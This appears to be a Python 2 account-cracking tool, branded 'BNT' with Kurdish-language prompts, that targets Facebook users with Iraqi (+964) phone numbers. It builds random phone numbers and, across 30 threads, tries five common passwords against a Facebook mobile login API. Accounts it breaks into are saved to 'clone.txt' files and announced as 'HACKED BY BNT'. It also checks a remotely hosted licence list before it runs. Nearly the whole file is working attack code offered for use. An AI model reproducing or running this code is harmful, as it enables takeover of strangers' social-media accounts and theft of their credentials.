import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass
os.system('rm -rf .txt')
for n in range(10000):
    nmbr = random.randint(1111111, 9999999)
    sys.stdout = open('.txt', 'a')
    print nmbr
    sys.stdout.flush()

try:
    import requests
except ImportError:
    os.system('pip2 install requests')

try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')

from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
bd = random.randint(20000000.0, 30000000.0)
sim = random.randint(20000.0, 40000.0)
header = {'x-fb-connection-bandwidth': repr(bd), 'x-fb-sim-hni': repr(sim), 'x-fb-net-hni': repr(sim), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': 'Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]', 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
os.system('clear')
os.system('rm -rf list.txt')
os.system('id -u > list.txt')
uidd = open('list.txt', 'r')
for j in uidd:
    sp = j.split()

manglist = requests.get('https://raw.githubusercontent.com/KURDISHIT/Kurdish-it/main/BNT.txt')
idd = manglist.text

def exb():
    print '[!] Exit'
    os.sys.exit()


def psb(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.01)


def t():
    os.system('clear')


def cb():
    os.system('clear')


back = 0
successful = []
cpb = []
oks = []
id = []
os.system('clear')


logo = """____  __  __ ______
 || )) ||\ || | || |
 ||=)  ||\\||   ||  
 ||_)) || \||   ||  
                    
NRXI TOOL.10$
Telegram/DRAGON CRACKER
Telegram/Chenall:KURDSTAN:IT
Telegram/XATAR       
--------------------------------------
   Note:Xat korek bakar bene facebook axom

      


        """
logo2 = """      ____  __  __ ______
 || )) ||\ || | || |
 ||=)  ||\\||   ||  
 ||_)) || \||   ||  
                                                                                    
                                                                        
NRXI.TOOL.10$
Telegram/DRAGON CRACKER
Telegram/Chenall/KURDSTAN/IT
Telegram/XATAR         
--------------------------------------
   Note:Xat korek bakar bene facebook axom

           

       """
CorrectUsername = 'DARK'
CorrectPassword = 'KURD'
os.system('clear')
print logo2
loop = 'true'
while loop == 'true':
    username = raw_input('\x1b[1;97m\xe2\x9e\xa3\x1b\x1b[31;1mTOOL USERNAME: ')
    if username == CorrectUsername:
        password = raw_input('\x1b[1;97m\xe2\x9e\xa3\x1b\x1b[31;1mTOOL PASSWORD: ')
        if password == CorrectPassword:
            print '\x1b[1;92m[\xe2\x9c\x93] Tawawa  ' + username
            
            time.sleep(3)
            loop = 'false'
        else:
            print 'Pass Halaya'
    else:
        print 'User Halaya'

def lisensi():
    os.system('clear')
    menu()




def menu():
    os.system('clear')
    print logo
    print '\x1b[1;91m[1]\x1b[1;91m  IRAQ'
    print '\x1b[1;91m[2]\x1b[1;91m  ERBIL'
    print '\x1b[1;91m[3]\x1b[1;91m  SLEMANI'
    print '\x1b[1;91m[4]\x1b[1;91m  KERKUK'
    print '\n\x1b[1;91m[0]  Exit            '
    print '\x1b[1;91m---------------------------------------------------------\n'
    action()


def action():
    global cpb
    global oks
    peak = raw_input('\n\x1b[1;91m=>DanayaK HalbzheRa:): \x1b[1;97m')
    if peak == '':
        print '[!] Fill In Correctly'
        action()
    elif peak == '1':
        os.system('clear')
        print logo
        print '\x1b[1;92mSaratakay Chan Be... ' + '\n'
        print '\x1b[1;92m770-771-772-773-774-\n 750-751-752-753-754-\n 780-781-782-783-784' + '\n'
        try:
            c = raw_input('\x1b[1;92mCHOOSE CODE: ')
            k = '+964'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()

    elif peak == '2':
        os.system('clear')
        print logo
        print '\x1b[1;92mSaratakay Chan Be... ' + '\n'
        print '\x1b[1;92m770-771-772-773-774-\n 750-751-752-753-754-\n 780-781-782-783-784' + '\n'
        try:
            c = raw_input('\x1b[1;97mCHOOSE CODE: ')
            k = '+964'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()

    elif peak == '3':
        os.system('clear')
        print logo
        print '\x1b[1;92mSaratakay Chan Be... ' + '\n'
        print '\x1b[1;92m770-771-772-773-774-\n 750-751-752-753-754-\n 780-781-782-783-784' + '\n'
        try:
            c = raw_input('\x1b[1;97mCHOOSE CODE: ')
            k = '+964'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()

    elif peak == '4':
        os.system('clear')
        print logo
        print '\x1b[1;92mSaratakay Chan Be... ' + '\n'
        print '\x1b[1;92m770-771-772-773-774-\n 750-751-752-753-754-\n 780-781-782-783-784' + '\n'
        try:
            c = raw_input('\x1b[1;92mCHOOSE CODE: ')
            k = '+964'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()

    elif peak == '5':
        os.system('clear')
        print logo
        print '\x1b[1;92mSaratakay Chan Be... ' + '\n'
        print '\x1b[1;92m770-771-772-773-774-\n 750-751-752-753-754-\n 780-781-782-783-784' + '\n'
        try:
            c = raw_input('\x1b[1;92mCHOOSE CODE: ')
            k = '+964'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()

    elif peak == '0':
        menu()
    else:
        print '[!] Fill In Correctly'
        action()
    xxx = str(len(id))
    psb('[\xe2\x9c\x93] Hamu Zhmarakan>>>>: ' + xxx)
    time.sleep(0.5)
    psb('[\xe2\x9c\x93] Dastw Pekrd')
    time.sleep(0.5)
    psb('[\xe2\x9c\x93] Tkaya bOsta Ta Tawaw Abe;)')
    time.sleep(0.5)
    psb('[!] Bo Wastan Dne Toolaka Ctrl+ Z Dagra')
    time.sleep(0.5)
    print '\x1b[1;97m--------------------------------------------------'

    def main(arg):
        user = arg
        try:
            os.mkdir('Matin')
        except OSError:
            pass

        try:
            pass1 = '1122334455'
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;92m[HACKED BY BNT]  ' + k + c + user + '  \x1b[1;92m|  ' + pass1
                okb = open('Successfully/clone.txt', 'a')
                okb.write(k + c + user + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;97m[SUTAWA] \x1b[1;97m' + k + c + user + '  \x1b[1;97m|  ' + pass1
                cps = open('Checkpoint/clone.txt', 'a')
                cps.write(k + c + user + pass1 + '\n')
                cps.close()
                cpb.append(c + user + pass1)
            else:
                pass2 = '123456123456'
                data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[1;92m[HACKED BY BNT]  ' + k + c + user + '  \x1b[1;92m|  ' + pass2
                    okb = open('Successfully/clone.txt', 'a')
                    okb.write(k + c + user + pass2 + '\n')
                    okb.close()
                    oks.append(c + user + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;97m[SUTAWA] \x1b[1;97m' + k + c + user + '  \x1b[1;97m|  ' + pass2
                    cps = open('Checkpoint/clone.txt', 'a')
                    cps.write(k + c + user + pass2 + '\n')
                    cps.close()
                    cpb.append(c + user + pass2)
                else:
                    pass3 = '112233445566'
                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;92m[HACKED BY BNT]  ' + k + c + user + '  \x1b[1;92m|  ' + pass3
                        okb = open('Successfully/clone.txt', 'a')
                        okb.write(k + c + user + pass3 + '\n')
                        okb.close()
                        oks.append(c + user + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print '\x1b[1;97m[SUTAWA] \x1b[1;97m' + k + c + user + '  \x1b[1;97m|  ' + pass3
                        cps = open('Checkpoint/clone.txt', 'a')
                        cps.write(k + c + user + pass3 + '\n')
                        cps.close()
                        cpb.append(c + user + pass3)
                    else:
                        pass4 = '123456654321'
                        data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                        q = json.load(data)
                        if 'access_token' in q:
                            print '\x1b[1;92m[HACKED BY BNT]  ' + k + c + user + '  \x1b[1;92m|  ' + pass4
                            okb = open('Successfully/clone.txt', 'a')
                            okb.write(k + c + user + pass4 + '\n')
                            okb.close()
                            oks.append(c + user + pass4)
                        elif 'www.facebook.com' in q['error_msg']:
                            print '\x1b[1;97m[SUTAWA] \x1b[1;97m' + k + c + user + '  \x1b[1;97m|  ' + pass4
                            cps = open('Checkpoint/clone.txt', 'a')
                            cps.write(k + c + user + pass4 + '\n')
                            cps.close()
                            cpb.append(c + user + pass4)
                        else:
                            pass5 = '1234554321'
                            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                            q = json.load(data)
                            if 'access_token' in q:
                                print '\x1b[1;92m[HACKED BY BNT]  ' + k + c + user + '  \x1b[1;92m|  ' + pass5
                                okb = open('Successfully/clone.txt', 'a')
                                okb.write(k + c + user + pass5 + '\n')
                                okb.close()
                                oks.append(c + user + pass5)
                            elif 'www.facebook.com' in q['error_msg']:
                                print '\x1b[1;97m[SUTAWA] \x1b[1;97m' + k + c + user + '  \x1b[1;97m|  ' + pass5
                                cps = open('Checkpoint/clone.txt', 'a')
                                cps.write(k + c + user + pass5 + '\n')
                                cps.close()
                                cpb.append(c + user + pass5)
                        
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\x1b[1;97m--------------------------------------------------'
    print '[\xe2\x9c\x93] Process Has Been Completed ...'
    print '[\xe2\x9c\x93] Total Successfully/Checkpoint : ' + str(len(oks)) + '/' + str(len(cpb))
    print '[\xe2\x9c\x93] Cloned Accounts Has Been Saved : anggaxd/clone.txt'
    raw_input('\n\x1b[1;97m[\x1b[1;97mBack\x1b[1;95m]')
    menu()


for s in idd.split():
    print s
    if s == sp[0]:
        if __name__ == '__main__':
            menu()
else:
    os.system('clear')
    os.system('figlet ID ACTIVE')
    print '       ID To Amaya ===> ' + sp[0]
    time.sleep(2)
    os.system('xdg-open https://t.me/Dragon_Crack4')
    os.sys.exit()
